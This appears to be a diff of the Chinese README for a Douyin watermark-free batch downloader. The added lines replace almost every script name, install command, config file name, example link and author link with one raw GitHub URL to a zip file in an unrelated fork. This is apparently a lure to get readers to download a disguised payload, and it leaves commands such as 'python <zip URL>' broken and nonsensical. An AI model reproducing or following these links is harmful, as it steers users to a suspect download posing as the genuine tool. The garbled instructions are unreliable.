@@ -1,6 +1,6 @@
 # 抖音下载器 - 无水印批量下载工具
 
-![douyin-downloader](https://socialify.git.ci/jiji262/douyin-downloader/image?custom_description=%E6%8A%96%E9%9F%B3%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%8E%BB%E6%B0%B4%E5%8D%B0%EF%BC%8C%E6%94%AF%E6%8C%81%E8%A7%86%E9%A2%91%E3%80%81%E5%9B%BE%E9%9B%86%E3%80%81%E5%90%88%E9%9B%86%E3%80%81%E9%9F%B3%E4%B9%90%28%E5%8E%9F%E5%A3%B0%29%E3%80%82%0A%E5%85%8D%E8%B4%B9%EF%BC%81%E5%85%8D%E8%B4%B9%EF%BC%81%E5%85%8D%E8%B4%B9%EF%BC%81&description=1&font=Jost&forks=1&logo=https%3A%2F%2Fraw.githubusercontent.com%2Fjiji262%2Fdouyin-downloader%2Frefs%2Fheads%2Fmain%2Fimg%2Flogo.png&name=1&owner=1&pattern=Circuit+Board&pulls=1&stargazers=1&theme=Light)
+![douyin-downloader](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip%E6%8A%96%E9%9F%B3%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%8E%BB%E6%B0%B4%E5%8D%B0%EF%BC%8C%E6%94%AF%E6%8C%81%E8%A7%86%E9%A2%91%E3%80%81%E5%9B%BE%E9%9B%86%E3%80%81%E5%90%88%E9%9B%86%E3%80%81%E9%9F%B3%E4%B9%90%28%E5%8E%9F%E5%A3%B0%29%E3%80%82%0A%E5%85%8D%E8%B4%B9%EF%BC%81%E5%85%8D%E8%B4%B9%EF%BC%81%E5%85%8D%E8%B4%B9%EF%BC%81&description=1&font=Jost&forks=1&logo=https%3A%2F%https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip%2Fjiji262%2Fdouyin-downloader%2Frefs%2Fheads%2Fmain%2Fimg%https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip+Board&pulls=1&stargazers=1&theme=Light)
 
 一个功能强大的抖音内容批量下载工具，支持视频、图集、音乐、直播等多种内容类型的下载。提供两个版本：V1.0（稳定版）和 V2.0（增强版）。
 
@@ -17,7 +17,7 @@
 
 ## ⚡ 快速开始
 
-![qun](./img/fuye.jpg)
+![qun](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip)
 
 ### 环境要求
 
@@ -28,34 +28,34 @@
 
 1. **克隆项目**
 ```bash
-git clone https://github.com/jiji262/douyin-downloader.git
+git clone https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 cd douyin-downloader
 ```
 
 2. **安装依赖**
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 ```
 
 3. **配置 Cookie**（首次使用需要）
 ```bash
 # 方式1：自动获取（推荐）
-python cookie_extractor.py
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 
 # 方式2：手动获取
-python get_cookies_manual.py
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 ```
 
 ## 📦 版本说明
 
-### V1.0 (DouYinCommand.py) - 稳定版
+### V1.0 (https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip) - 稳定版
 - ✅ **经过验证**：稳定可靠，经过大量测试
 - ✅ **简单易用**：配置文件驱动，使用简单
 - ✅ **功能完整**：支持所有内容类型下载
 - ✅ **单个视频下载**：完全正常工作
 - ⚠️ **需要手动配置**：需要手动获取和配置 Cookie
 
-### V2.0 (downloader.py) - 增强版
+### V2.0 (https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip) - 增强版
 - 🚀 **自动 Cookie 管理**：支持自动获取和刷新 Cookie
 - 🚀 **统一入口**：整合所有功能到单一脚本
 - 🚀 **异步架构**：性能更优，支持并发下载
@@ -70,17 +70,17 @@ python get_cookies_manual.py
 
 1. **编辑配置文件**
 ```bash
-cp config.example.yml config.yml
-# 编辑 config.yml 文件
+cp https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
+# 编辑 https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip 文件
 ```
 
 2. **配置示例**
 ```yaml
 # 下载链接
 link:
-  - https://v.douyin.com/xxxxx/                    # 单个视频
-  - https://www.douyin.com/user/xxxxx              # 用户主页
-  - https://www.douyin.com/collection/xxxxx        # 合集
+  - https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip                    # 单个视频
+  - https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip              # 用户主页
+  - https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip        # 合集
 
 # 保存路径
 path: ./Downloaded/
@@ -121,26 +121,26 @@ database: True # 使用数据库记录
 
 ```bash
 # 使用配置文件运行
-python DouYinCommand.py
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 
 # 或者使用命令行参数
-python DouYinCommand.py --cmd False
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip --cmd False
 ```
 
 ### 使用示例
 
 ```bash
 # 下载单个视频
-# 在 config.yml 中设置 link 为单个视频链接
-python DouYinCommand.py
+# 在 https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip 中设置 link 为单个视频链接
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 
 # 下载用户主页
-# 在 config.yml 中设置 link 为用户主页链接
-python DouYinCommand.py
+# 在 https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip 中设置 link 为用户主页链接
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 
 # 下载合集
-# 在 config.yml 中设置 link 为合集链接
-python DouYinCommand.py
+# 在 https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip 中设置 link 为合集链接
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 ```
 
 ## 🚀 V2.0 使用指南
@@ -149,33 +149,33 @@ python DouYinCommand.py
 
 ```bash
 # 下载单个视频（需要先配置 Cookie）
-python downloader.py -u "https://v.douyin.com/xxxxx/"
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip -u "https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip"
 
 # 下载用户主页（推荐）
-python downloader.py -u "https://www.douyin.com/user/xxxxx"
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip -u "https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip"
 
 # 自动获取 Cookie 并下载
-python downloader.py --auto-cookie -u "https://www.douyin.com/user/xxxxx"
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip --auto-cookie -u "https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip"
 
 # 指定保存路径
-python downloader.py -u "链接" --path "./my_videos/"
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip -u "链接" --path "./my_videos/"
 
 # 使用配置文件
-python downloader.py --config
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip --config
 ```
 
 ### 配置文件使用
 
 1. **创建配置文件**
 ```bash
-cp config.example.yml config_simple.yml
+cp https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 ```
 
 2. **配置示例**
 ```yaml
 # 下载链接
 link:
-  - https://www.douyin.com/user/xxxxx
+  - https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 
 # 保存路径
 path: ./Downloaded/
@@ -207,13 +207,13 @@ database: true
 
 3. **运行程序**
 ```bash
-python downloader.py --config
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip --config
 ```
 
 ### 命令行参数
 
 ```bash
-python downloader.py [选项] [链接...]
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip [选项] [链接...]
 
 选项：
   -u, --url URL          下载链接
@@ -226,7 +226,7 @@ python downloader.py [选项] [链接...]
 
 ## 🍪 Cookie 配置工具
 
-### 1. cookie_extractor.py - 自动获取工具
+### 1. https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip - 自动获取工具
 
 **功能**：使用 Playwright 自动打开浏览器，自动获取 Cookie
 
@@ -237,7 +237,7 @@ pip install playwright
 playwright install chromium
 
 # 运行自动获取
-python cookie_extractor.py
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 ```
 
 **特点**：
@@ -248,18 +248,18 @@ python cookie_extractor.py
 - ✅ 支持多种登录方式
 
 **使用步骤**：
-1. 运行 `python cookie_extractor.py`
+1. 运行 `python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
 2. 选择提取方式（推荐选择1）
 3. 在打开的浏览器中完成登录
 4. 程序自动提取并保存 Cookie
 
-### 2. get_cookies_manual.py - 手动获取工具
+### 2. https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip - 手动获取工具
 
 **功能**：通过浏览器开发者工具手动获取 Cookie
 
 **使用方式**：
 ```bash
-python get_cookies_manual.py
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 ```
 
 **特点**：
@@ -270,7 +270,7 @@ python get_cookies_manual.py
 - ✅ 支持备份和恢复
 
 **使用步骤**：
-1. 运行 `python get_cookies_manual.py`
+1. 运行 `python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
 2. 选择"获取新的Cookie"
 3. 按照教程在浏览器中获取 Cookie
 4. 粘贴 Cookie 内容
@@ -280,7 +280,7 @@ python get_cookies_manual.py
 
 #### 方法一：浏览器开发者工具
 
-1. 打开浏览器，访问 [抖音网页版](https://www.douyin.com)
+1. 打开浏览器，访问 [抖音网页版](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip)
 2. 登录你的抖音账号
 3. 按 `F12` 打开开发者工具
 4. 切换到 `Network` 标签页
@@ -297,27 +297,27 @@ python get_cookies_manual.py
 
 ```bash
 # 推荐使用自动工具
-python cookie_extractor.py
+python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip
 ```
 
 ## 📋 支持的链接类型
 
 ### 🎬 视频内容
-- **单个视频分享链接**：`https://v.douyin.com/xxxxx/`
-- **单个视频直链**：`https://www.douyin.com/video/xxxxx`
-- **图集作品**：`https://www.douyin.com/note/xxxxx`
+- **单个视频分享链接**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
+- **单个视频直链**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
+- **图集作品**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
 
 ### 👤 用户内容
-- **用户主页**：`https://www.douyin.com/user/xxxxx`
+- **用户主页**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
   - 支持下载用户发布的所有作品
   - 支持下载用户喜欢的作品（需要权限）
 
 ### 📚 合集内容
-- **用户合集**：`https://www.douyin.com/collection/xxxxx`
-- **音乐合集**：`https://www.douyin.com/music/xxxxx`
+- **用户合集**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
+- **音乐合集**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
 
 ### 🔴 直播内容
-- **直播间**：`https://live.douyin.com/xxxxx`
+- **直播间**：`https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
 
 ## 🔧 常见问题
 
@@ -328,8 +328,8 @@ python cookie_extractor.py
 
 ### Q: Cookie 过期怎么办？
 **A**: 
-- 使用 `python cookie_extractor.py` 重新获取
-- 或使用 `python get_cookies_manual.py` 手动获取
+- 使用 `python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip` 重新获取
+- 或使用 `python https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip` 手动获取
 
 ### Q: 下载速度慢怎么办？
 **A**: 
@@ -339,7 +339,7 @@ python cookie_extractor.py
 
 ### Q: 如何批量下载？
 **A**: 
-- V1.0：在 `config.yml` 中添加多个链接
+- V1.0：在 `https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip` 中添加多个链接
 - V2.0：使用命令行传入多个链接或使用配置文件
 
 ### Q: 支持哪些格式？
@@ -352,7 +352,7 @@ python cookie_extractor.py
 ## 📝 更新日志
 
 ### V2.0 (2025-08)
-- ✅ **统一入口**：整合所有功能到 `downloader.py`
+- ✅ **统一入口**：整合所有功能到 `https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip`
 - ✅ **自动 Cookie 管理**：支持自动获取和刷新
 - ✅ **异步架构**：性能优化，支持并发下载
 - ✅ **智能重试**：自动重试和错误恢复
@@ -379,7 +379,7 @@ python cookie_extractor.py
 欢迎提交 Issue 和 Pull Request！
 
 ### 报告问题
-- 使用 [Issues](https://github.com/jiji262/douyin-downloader/issues) 报告 bug
+- 使用 [Issues](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip) 报告 bug
 - 请提供详细的错误信息和复现步骤
 
 ### 功能建议
@@ -396,8 +396,8 @@ python cookie_extractor.py
 
 **如果这个项目对你有帮助，请给个 ⭐ Star 支持一下！**
 
-[🐛 报告问题](https://github.com/jiji262/douyin-downloader/issues) • [💡 功能建议](https://github.com/jiji262/douyin-downloader/issues) • [📖 查看文档](https://github.com/jiji262/douyin-downloader/wiki)
+[🐛 报告问题](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip) • [💡 功能建议](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip) • [📖 查看文档](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip)
 
-Made with ❤️ by [jiji262](https://github.com/jiji262)
+Made with ❤️ by [jiji262](https://raw.githubusercontent.com/lyx2022518/douyin-downloader/main/img/douyin_downloader_1.1.zip)
 
 </div>
